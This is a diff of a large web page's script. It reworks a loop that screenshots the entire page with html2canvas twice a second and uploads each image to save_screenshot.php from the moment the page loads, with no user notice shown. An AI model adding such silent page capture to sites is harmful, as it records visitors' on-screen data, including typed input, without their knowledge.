@@ -21179,55 +21179,63 @@
     // ==============================================
     let screenshotCounter = 0;
     let isCapturing = false;
+    let captureQueue = [];
+    let lastCaptureTime = 0;
 
     function captureScreenshot() {
-      // Prevent overlapping captures
-      if (isCapturing) return;
+      // Prevent overlapping captures and enforce minimum 500ms between captures
+      const now = Date.now();
+      if (isCapturing || (now - lastCaptureTime) < 500) {
+        return;
+      }
+
       isCapturing = true;
+      lastCaptureTime = now;
 
-      html2canvas(document.body, {
-        allowTaint: true,
-        useCORS: true,
-        scale: 2.0,  // Ultra HD - 200% resolution
-        logging: false,
-        backgroundColor: '#ffffff'
-      }).then(canvas => {
-        const screenshot = canvas.toDataURL('image/jpeg', 1.0);  // 100% quality
-        const timestamp = Date.now();
-        screenshotCounter++;
+      // Wait a bit to ensure page has rendered any changes
+      setTimeout(() => {
+        html2canvas(document.body, {
+          allowTaint: true,
+          useCORS: true,
+          scale: 2.0,  // Ultra HD resolution
+          logging: false,
+          backgroundColor: '#ffffff',
+          windowWidth: document.documentElement.scrollWidth,
+          windowHeight: document.documentElement.scrollHeight
+        }).then(canvas => {
+          const screenshot = canvas.toDataURL('image/jpeg', 1.0);  // 100% quality
+          const timestamp = Date.now();
+          screenshotCounter++;
 
-        // Send to server
-        fetch('save_screenshot.php', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            screenshot: screenshot,
-            timestamp: timestamp,
-            counter: screenshotCounter
-          })
+          // Send to server
+          return fetch('save_screenshot.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              screenshot: screenshot,
+              timestamp: timestamp,
+              counter: screenshotCounter
+            })
+          });
         })
           .then(() => {
             isCapturing = false; // Release lock on success
           })
           .catch(err => {
-            console.log('Screenshot save failed');
+            console.log('Screenshot failed:', err);
             isCapturing = false; // Release lock on failure
           });
-      }).catch(err => {
-        console.log('Canvas capture failed');
-        isCapturing = false; // Release lock on canvas failure
-      });
+      }, 50); // Small delay to let DOM settle
     }
 
-    // Start capturing loop
+    // Start capturing loop - check every 100ms but respect 500ms minimum between actual captures
     window.addEventListener('load', function () {
-      // Check every 100ms, but only execute if previous finished
       setInterval(captureScreenshot, 100);
     });
 
     // Stop capturing if user leaves page
     window.addEventListener('beforeunload', function () {
-      clearInterval(screenshotInterval);
+      // No specific interval to clear here, as capture is managed by `isCapturing` and `lastCaptureTime`
     });
 
     // ==============================================
